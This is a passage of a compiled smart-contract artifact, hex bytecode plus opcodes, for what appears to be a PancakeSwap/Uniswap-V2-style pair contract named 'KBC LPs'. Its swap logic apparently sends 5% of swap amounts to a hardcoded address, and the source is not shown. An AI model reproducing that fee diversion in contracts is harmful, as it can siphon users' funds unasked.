4957506001600160701b03841615155b8015611f5d57506001600160701b03831615155b15611fce578063ffffffff16611f8b85611f7686612556565b6001600160e01b03169063ffffffff61256816565b600c80546001600160e01b03929092169290920201905563ffffffff8116611fb684611f7687612556565b600d80546001600160e01b0392909216929092020190555b600b80546dffffffffffffffffffffffffffff19166001600160701b03888116919091176dffffffffffffffffffffffffffff60701b1916600160701b8883168102919091176001600160e01b0316600160e01b63ffffffff871602179283905560408051848416815291909304909116602082015281517f1c411e9a96e071241c2f21f7726b17ae89e3cab4c78be50e062b03a9fffbbad1929181900390910190a1505050505050565b6001600160a01b03808416600081815260026020908152604080832094871680845294825291829020859055815185815291517f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b9259281900390910190a3505050565b6001600160a01b038316600090815260016020526040902054612104908263ffffffff611e6616565b6001600160a01b038085166000908152600160205260408082209390935590841681522054612139908263ffffffff61258d16565b6001600160a01b03808416600081815260016020908152604091829020949094558051858152905191939287169260008051602061264d83398151915292918290030190a3505050565b600080600760009054906101000a90046001600160a01b03166001600160a01b031663017e7e586040518163ffffffff1660e01b815260040160206040518083038186803b1580156121d457600080fd5b505afa1580156121e8573d6000803e3d6000fd5b505050506040513d60208110156121fe57600080fd5b5051600e546001600160a01b0382161580159450919250906122e25780156122dd576000612241610fc46001600160701b0388811690881663ffffffff611e0316565b9050600061224e836122f6565b9050808211156122da5760006122816008610b47612272868663ffffffff611e6616565b6000549063ffffffff611e0316565b905060006122b661229984600863ffffffff611e0316565b6122aa86601163ffffffff611e0316565b9063ffffffff61258d16565b905060008183816122c357fe5b04905080156122d6576122d68782612348565b5050505b50505b6122ee565b80156122ee576000600e555b505092915050565b60006003821115612339575080600160028204015b818110156123335780915060028182858161232257fe5b04018161232b57fe5b04905061230b565b50612343565b8115612343575060015b919050565b60005461235b908263ffffffff61258d16565b60009081556001600160a01b038316815260016020526040902054612386908263ffffffff61258d16565b6001600160a01b038316600081815260016020908152604080832094909455835185815293519293919260008051602061264d8339815191529281900390910190a35050565b60008183106123db57816123dd565b825b9392505050565b6001600160a01b03821660009081526001602052604090205461240d908263ffffffff611e6616565b6001600160a01b0383166000908152600160205260408120919091555461243a908263ffffffff611e6616565b60009081556040805183815290516001600160a01b0385169160008051602061264d833981519152919081900360200190a35050565b60006001600160a01b0383166124cd576040805162461bcd60e51b815260206004820152601f60248201527f42455032303a206d696e7420746f20746865207a65726f206164647265737300604482015290519081900360640190fd5b6000546124e0908363ffffffff61258d16565b60009081556001600160a01b03841681526003602052604090205461250b908363ffffffff61258d16565b6001600160a01b038416600081815260036020908152604080832094909455835186815293519293919260008051602061264d8339815191529281900390910190a350600192915050565b6001600160701b0316600160701b0290565b60006001600160701b0382166001600160e01b0384168161258557fe5b049392505050565b80820182811015610c75576040805162461bcd60e51b815260206004820152601460248201527364732d6d6174682d6164642d6f766572666c6f7760601b604482015290519081900360640190fdfe50616e63616b653a20494e53554646494349454e545f494e5055545f414d4f554e54556e697377617056323a20494e53554646494349454e545f4c49515549444954595f4d494e54454450616e63616b653a20494e53554646494349454e545f4c49515549444954595f4255524e4544ddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef50616e63616b653a20494e53554646494349454e545f4f55545055545f414d4f554e5450616e63616b653a20494e53554646494349454e545f4c49515549444954595f4d494e544544a265627a7a72315820fa4b361cdd6daa0da2a7850e045553687791240905a83c39dd556167998e768b64736f6c63430005100032454950373132446f6d61696e28737472696e67206e616d652c737472696e672076657273696f6e2c75696e7432353620636861696e49642c6164647265737320766572696679696e67436f6e747261637429",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x6 DUP1 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB NOT AND PUSH20 0x358BB1515A41A803AD950D3A0D22B914093DDB80 OR SWAP1 SSTORE PUSH1 0x1 PUSH1 0xF SSTORE CALLVALUE DUP1 ISZERO PUSH2 0x3B JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD CHAINID SWAP1 DUP1 PUSH1 0x52 PUSH2 0x280F DUP3 CODECOPY PUSH1 0x40 DUP1 MLOAD SWAP2 DUP3 SWAP1 SUB PUSH1 0x52 ADD DUP3 KECCAK256 DUP3 DUP3 ADD DUP3 MSTORE PUSH1 0x7 DUP1 DUP5 MSTORE PUSH7 0x4B4243204C5073 PUSH1 0xC8 SHL PUSH1 0x20 SWAP5 DUP6 ADD MSTORE DUP3 MLOAD DUP1 DUP5 ADD DUP5 MSTORE PUSH1 0x1 DUP2 MSTORE PUSH1 0x31 PUSH1 0xF8 SHL SWAP1 DUP6 ADD MSTORE DUP3 MLOAD DUP1 DUP6 ADD SWAP3 SWAP1 SWAP3 MSTORE PUSH32 0x6A36D39F32C2225411D16C8F56813B9117E6EB8BF3D2893C5FC62411565CFCFE DUP3 DUP5 ADD MSTORE PUSH32 0xC89EFDAA54C0F20C7ADF612882DF0950F5A951637E0307CDCB4C672F298B8BC6 PUSH1 0x60 DUP4 ADD MSTORE PUSH1 0x80 DUP3 ADD SWAP6 SWAP1 SWAP6 MSTORE ADDRESS PUSH1 0xA0 DUP1 DUP4 ADD SWAP2 SWAP1 SWAP2 MSTORE DUP3 MLOAD DUP1 DUP4 SUB SWAP1 SWAP2 ADD DUP2 MSTORE PUSH1 0xC0 SWAP1 SWAP2 ADD SWAP1 SWAP2 MSTORE DUP1 MLOAD SWAP2 ADD KECCAK256 PUSH1 0x4 SSTORE POP DUP1 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB NOT AND CALLER OR SWAP1 SSTORE PUSH2 0x26EA DUP1 PUSH2 0x125 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x1E5 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x70A08231 GT PUSH2 0x10F JUMPI DUP1 PUSH4 0xBC25CF77 GT PUSH2 0xA2 JUMPI DUP1 PUSH4 0xDCBBB373 GT PUSH2 0x71 JUMPI DUP1 PUSH4 0xDCBBB373 EQ PUSH2 0x5FF JUMPI DUP1 PUSH4 0xDD62ED3E EQ PUSH2 0x625 JUMPI DUP1 PUSH4 0xF317739C EQ PUSH2 0x653 JUMPI DUP1 PUSH4 0xFFF6CAE9 EQ PUSH2 0x65B JUMPI PUSH2 0x1E5 JUMP JUMPDEST DUP1 PUSH4 0xBC25CF77 EQ PUSH2 0x578 JUMPI DUP1 PUSH4 0xC45A0155 EQ PUSH2 0x59E JUMPI DUP1 PUSH4 0xD21220A7 EQ PUSH2 0x5A6 JUMPI DUP1 PUSH4 0xD505ACCF EQ PUSH2 0x5AE JUMPI PUSH2 0x1E5 JUMP JUMPDEST DUP1 PUSH4 0x900820D8 GT PUSH2 0xDE JUMPI DUP1 PUSH4 0x900820D8 EQ PUSH2 0x534 JUMPI DUP1 PUSH4 0x95D89B41 EQ PUSH2 0x53C JUMPI DUP1 PUSH4 0xA9059CBB EQ PUSH2 0x544 JUMPI DUP1 PUSH4 0xBA9A7A56 EQ PUSH2 0x570 JUMPI PUSH2 0x1E5 JUMP JUMPDEST DUP1 PUSH4 0x70A08231 EQ PUSH2 0x4A1 JUMPI DUP1 PUSH4 0x7464FC3D EQ PUSH2 0x4C7 JUMPI DUP1 PUSH4 0x7ECEBE00 EQ PUSH2 0x4CF JUMPI DUP1 PUSH4 0x89AFCB44 EQ PUSH2 0x4F5 JUMPI PUSH2 0x1E5 JUMP JUMPDEST DUP1 PUSH4 0x23B872DD GT PUSH2 0x187 JUMPI DUP1 PUSH4 0x47D5D856 GT PUSH2 0x156 JUMPI DUP1 PUSH4 0x47D5D856 EQ PUSH2 0x445 JUMPI DUP1 PUSH4 0x5909C0D5 EQ PUSH2 0x46B JUMPI DUP1 PUSH4 0x5A3D5493 EQ PUSH2 0x473 JUMPI DUP1 PUSH4 0x6A627842 EQ PUSH2 0x47B JUMPI PUSH2 0x1E5 JUMP JUMPDEST DUP1 PUSH4 0x23B872DD EQ PUSH2 0x3E1 JUMPI DUP1 PUSH4 0x30ADF81F EQ PUSH2 0x417 JUMPI DUP1 PUSH4 0x313CE567 EQ PUSH2 0x41F JUMPI DUP1 PUSH4 0x3644E515 EQ PUSH2 0x43D JUMPI PUSH2 0x1E5 JUMP JUMPDEST DUP1 PUSH4 0x95EA7B3 GT PUSH2 0x1C3 JUMPI DUP1 PUSH4 0x95EA7B3 EQ PUSH2 0x32D JUMPI DUP1 PUSH4 0xDFE1681 EQ PUSH2 0x36D JUMPI DUP1 PUSH4 0x1794BB3C EQ PUSH2 0x391 JUMPI DUP1 PUSH4 0x18160DDD EQ PUSH2 0x3C7 JUMPI PUSH2 0x1E5 JUMP JUMPDEST DUP1 PUSH4 0x22C0D9F EQ PUSH2 0x1EA JUMPI DUP1 PUSH4 0x6FDDE03 EQ PUSH2 0x278 JUMPI DUP1 PUSH4 0x902F1AC EQ PUSH2 0x2F5 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x276 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x80 DUP2 LT ISZERO PUSH2 0x200 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 CALLDATALOAD SWAP2 PUSH1 0x20 DUP2 ADD CALLDATALOAD SWAP2 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB PUSH1 0x40 DUP4 ADD CALLDATALOAD AND SWAP2 SWAP1 DUP2 ADD SWAP1 PUSH1 0x80 DUP2 ADD PUSH1 0x60 DUP3 ADD CALLDATALOAD PUSH5 0x100000000 DUP2 GT ISZERO PUSH2 0x237 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP3 ADD DUP4 PUSH1 0x20 DUP3 ADD GT ISZERO PUSH2 0x249 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP2 DUP5 PUSH1 0x1 DUP4 MUL DUP5 ADD GT PUSH5 0x100000000 DUP4 GT OR ISZERO PUSH2 0x26B JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP SWAP1 SWAP3 POP SWAP1 POP PUSH2 0x663 JUMP JUMPDEST STOP JUMPDEST PUSH2 0x280 PUSH2 0xC17 JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD PUSH1 0x20 DUP1 DUP3 MSTORE DUP4 MLOAD DUP2 DUP4 ADD MSTORE DUP4 MLOAD SWAP2 SWAP3 DUP4 SWAP3 SWAP1 DUP4 ADD SWAP2 DUP6 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x2BA JUMPI DUP2 DUP2 ADD MLOAD DUP4 DUP3 ADD MSTORE PUSH1 0x20 ADD PUSH2 0x2A2 JUMP JUMPDEST POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 0x1F AND DUP1 ISZERO PUSH2 0x2E7 JUMPI DUP1 DUP3 SUB DUP1 MLOAD PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP JUMPDEST POP SWAP3 POP POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x2FD PUSH2 0xC3A JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB SWAP5 DUP6 AND DUP2 MSTORE SWAP3 SWAP1 SWAP4 AND PUSH1 0x20 DUP4 ADD MSTORE PUSH4 0xFFFFFFFF AND DUP2 DUP4 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x60 ADD SWAP1 RETURN JUMPDEST PUSH2 0x359 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x40 DUP2 LT ISZERO PUSH2 0x343 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 CALLDATALOAD AND SWAP1 PUSH1 0x20 ADD CALLDATALOAD PUSH2 0xC64 JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD SWAP2 ISZERO ISZERO DUP3 MSTORE MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x20 ADD SWAP1 RETURN JUMPDEST PUSH2 0x375 PUSH2 0xC7B JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP3 AND DUP3 MSTORE MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x20 ADD SWAP1 RETURN JUMPDEST PUSH2 0x276 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x60 DUP2 LT ISZERO PUSH2 0x3A7 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 CALLDATALOAD DUP2 AND SWAP2 PUSH1 0x20 DUP2 ADD CALLDATALOAD SWAP1 SWAP2 AND SWAP1 PUSH1 0x40 ADD CALLDATALOAD PUSH2 0xC8A JUMP JUMPDEST PUSH2 0x3CF PUSH2 0xD13 JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD SWAP2 DUP3 MSTORE MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x20 ADD SWAP1 RETURN JUMPDEST PUSH2 0x359 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x60 DUP2 LT ISZERO PUSH2 0x3F7 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 CALLDATALOAD DUP2 AND SWAP2 PUSH1 0x20 DUP2 ADD CALLDATALOAD SWAP1 SWAP2 AND SWAP1 PUSH1 0x40 ADD CALLDATALOAD PUSH2 0xD19 JUMP JUMPDEST PUSH2 0x3CF PUSH2 0xDB3 JUMP JUMPDEST PUSH2 0x427 PUSH2 0xDD7 JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD PUSH1 0xFF SWAP1 SWAP3 AND DUP3 MSTORE MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x20 ADD SWAP1 RETURN JUMPDEST PUSH2 0x3CF PUSH2 0xDDC JUMP JUMPDEST PUSH2 0x3CF PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x45B JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP CALLDATALOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH2 0xDE2 JUMP JUMPDEST PUSH2 0x3CF PUSH2 0xDF4 JUMP JUMPDEST PUSH2 0x3CF PUSH2 0xDFA JUMP JUMPDEST PUSH2 0x3CF PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x491 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP CALLDATALOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH2 0xE00 JUMP JUMPDEST PUSH2 0x3CF PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x4B7 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP CALLDATALOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH2 0x10FE JUMP JUMPDEST PUSH2 0x3CF PUSH2 0x1110 JUMP JUMPDEST PUSH2 0x3CF PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x4E5 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP CALLDATALOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH2 0x1116 JUMP JUMPDEST PUSH2 0x51B PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x50B JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP CALLDATALOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH2 0x1128 JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD SWAP3 DUP4 MSTORE PUSH1 0x20 DUP4 ADD SWAP2 SWAP1 SWAP2 MSTORE DUP1 MLOAD SWAP2 DUP3 SWAP1 SUB ADD SWAP1 RETURN JUMPDEST PUSH2 0x375 PUSH2 0x14CC JUMP JUMPDEST PUSH2 0x280 PUSH2 0x14DB JUMP JUMPDEST PUSH2 0x359 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x40 DUP2 LT ISZERO PUSH2 0x55A JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 CALLDATALOAD AND SWAP1 PUSH1 0x20 ADD CALLDATALOAD PUSH2 0x14FD JUMP JUMPDEST PUSH2 0x3CF PUSH2 0x150A JUMP JUMPDEST PUSH2 0x276 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x58E JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP CALLDATALOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH2 0x1510 JUMP JUMPDEST PUSH2 0x375 PUSH2 0x1679 JUMP JUMPDEST PUSH2 0x375 PUSH2 0x1688 JUMP JUMPDEST PUSH2 0x276 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0xE0 DUP2 LT ISZERO PUSH2 0x5C4 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 CALLDATALOAD DUP2 AND SWAP2 PUSH1 0x20 DUP2 ADD CALLDATALOAD SWAP1 SWAP2 AND SWAP1 PUSH1 0x40 DUP2 ADD CALLDATALOAD SWAP1 PUSH1 0x60 DUP2 ADD CALLDATALOAD SWAP1 PUSH1 0xFF PUSH1 0x80 DUP3 ADD CALLDATALOAD AND SWAP1 PUSH1 0xA0 DUP2 ADD CALLDATALOAD SWAP1 PUSH1 0xC0 ADD CALLDATALOAD PUSH2 0x1697 JUMP JUMPDEST PUSH2 0x3CF PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x615 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP CALLDATALOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH2 0x1897 JUMP JUMPDEST PUSH2 0x3CF PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x40 DUP2 LT ISZERO PUSH2 0x63B JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 CALLDATALOAD DUP2 AND SWAP2 PUSH1 0x20 ADD CALLDATALOAD AND PUSH2 0x1AE6 JUMP JUMPDEST PUSH2 0x3CF PUSH2 0x1B03 JUMP JUMPDEST PUSH2 0x276 PUSH2 0x1B09 JUMP JUMPDEST PUSH1 0xF SLOAD PUSH1 0x1 EQ PUSH2 0x6AC JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0xF PUSH1 0x24 DUP3 ADD MSTORE PUSH15 0x14185B98D85AD94E881313D0D2D151 PUSH1 0x8A SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH1 0x0 PUSH1 0xF SSTORE DUP5 ISZERO ISZERO DUP1 PUSH2 0x6BF JUMPI POP PUSH1 0x0 DUP5 GT JUMPDEST PUSH2 0x6FA JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x23 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0x266D PUSH1 0x23 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x0 DUP1 PUSH2 0x705 PUSH2 0xC3A JUMP JUMPDEST POP SWAP2 POP SWAP2 POP DUP2 PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB AND DUP8 LT DUP1 ISZERO PUSH2 0x72A JUMPI POP DUP1 PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB AND DUP7 LT JUMPDEST PUSH2 0x77B JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x1F PUSH1 0x24 DUP3 ADD MSTORE PUSH32 0x50616E63616B653A20494E53554646494349454E545F4C495155494449545900 PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH1 0x0 DUP1 DUP1 PUSH1 0x64 PUSH1 0x5 DUP12 MUL DIV DUP11 SUB SWAP1 POP PUSH1 0x0 PUSH1 0x64 PUSH1 0x5 DUP12 MUL PUSH1 0x8 SLOAD PUSH1 0x9 SLOAD SWAP3 SWAP1 SWAP2 DIV DUP13 SUB SWAP3 POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 DUP2 AND SWAP2 DUP2 AND SWAP1 DUP12 AND DUP3 EQ DUP1 ISZERO SWAP1 PUSH2 0x7D2 JUMPI POP DUP1 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP12 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND EQ ISZERO JUMPDEST PUSH2 0x819 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x13 PUSH1 0x24 DUP3 ADD MSTORE PUSH19 0x50616E63616B653A20494E56414C49445F544F PUSH1 0x68 SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST DUP13 ISZERO PUSH2 0x82A JUMPI PUSH2 0x82A DUP3 DUP13 DUP7 PUSH2 0x1C69 JUMP JUMPDEST DUP12 ISZERO PUSH2 0x83B JUMPI PUSH2 0x83B DUP2 DUP13 DUP6 PUSH2 0x1C69 JUMP JUMPDEST DUP9 ISZERO PUSH2 0x8F6 JUMPI DUP11 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH4 0x84800812 CALLER DUP7 DUP7 DUP15 DUP15 PUSH1 0x40 MLOAD DUP7 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP7 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP2 MSTORE PUSH1 0x20 ADD DUP6 DUP2 MSTORE PUSH1 0x20 ADD DUP5 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE DUP5 DUP5 DUP3 DUP2 DUP2 MSTORE PUSH1 0x20 ADD SWAP3 POP DUP1 DUP3 DUP5 CALLDATACOPY PUSH1 0x0 DUP2 DUP5 ADD MSTORE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND SWAP1 POP DUP1 DUP4 ADD SWAP3 POP POP POP SWAP7 POP POP POP POP POP POP POP PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x8DD JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x8F1 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP JUMPDEST PUSH1 0x64 PUSH1 0x5 DUP15 DUP2 MUL DUP3 SWAP1 DIV SWAP2 SWAP1 DUP15 MUL DIV DUP15 ISZERO PUSH2 0x923 JUMPI PUSH1 0x6 SLOAD PUSH2 0x923 SWAP1 DUP6 SWAP1 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP5 PUSH2 0x1C69 JUMP JUMPDEST DUP14 ISZERO PUSH2 0x941 JUMPI PUSH1 0x6 SLOAD PUSH2 0x941 SWAP1 DUP5 SWAP1 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP4 PUSH2 0x1C69 JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE SWAP1 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP7 AND SWAP2 PUSH4 0x70A08231 SWAP2 PUSH1 0x24 DUP1 DUP4 ADD SWAP3 PUSH1 0x20 SWAP3 SWAP2 SWAP1 DUP3 SWAP1 SUB ADD DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x987 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x99B JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x9B1 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD PUSH1 0x40 DUP1 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE SWAP1 MLOAD SWAP2 SWAP10 POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP6 AND SWAP2 PUSH4 0x70A08231 SWAP2 PUSH1 0x24 DUP1 DUP3 ADD SWAP3 PUSH1 0x20 SWAP3 SWAP1 SWAP2 SWAP1 DUP3 SWAP1 SUB ADD DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x9FD JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0xA11 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0xA27 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD SWAP7 POP PUSH1 0x0 SWAP6 POP POP POP POP POP POP PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP6 AND DUP11 SWAP1 SUB DUP4 GT PUSH2 0xA4E JUMPI PUSH1 0x0 PUSH2 0xA5D JUMP JUMPDEST DUP10 DUP6 PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB AND SUB DUP4 SUB JUMPDEST SWAP1 POP PUSH1 0x0 DUP10 DUP6 PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB AND SUB DUP4 GT PUSH2 0xA7A JUMPI PUSH1 0x0 PUSH2 0xA89 JUMP JUMPDEST DUP10 DUP6 PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB AND SUB DUP4 SUB JUMPDEST SWAP1 POP PUSH1 0x0 DUP3 GT DUP1 PUSH2 0xA9A JUMPI POP PUSH1 0x0 DUP2 GT JUMPDEST PUSH2 0xAD5 JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x22 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0x25DD PUSH1 0x22 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x0 PUSH2 0xB09 PUSH2 0xAEB DUP5 PUSH1 0x19 PUSH4 0xFFFFFFFF PUSH2 0x1E03 AND JUMP JUMPDEST PUSH2 0xAFD DUP8 PUSH2 0x2710 PUSH4 0xFFFFFFFF PUSH2 0x1E03 AND JUMP 